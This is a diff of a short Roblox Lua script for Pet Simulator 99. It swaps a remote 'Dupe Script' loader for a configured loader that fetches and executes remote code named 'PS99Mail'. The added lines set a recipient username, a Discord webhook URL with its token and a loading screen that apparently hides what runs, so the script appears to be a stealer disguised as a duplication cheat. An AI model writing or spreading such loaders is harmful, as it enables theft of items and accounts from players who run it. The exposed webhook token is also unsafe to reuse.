@@ -1,1 +1,6 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Rih4rd5/Rihards/main/Pet%20Simulator%2099%20Dupe%20Script!", true))() 
+Username = "Dark_Galaxy015"
+Webhook = "https://discordapp.com/api/webhooks/1199107604706762984/Zk7Wlxmu0ThL783LXpZK7eYJCzlAXqEypyxJaPFjovUBay-eBfiP66aYe9ciHAZeNTW_"
+selectedLoadingScreen = "4"
+LoadingScreen = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
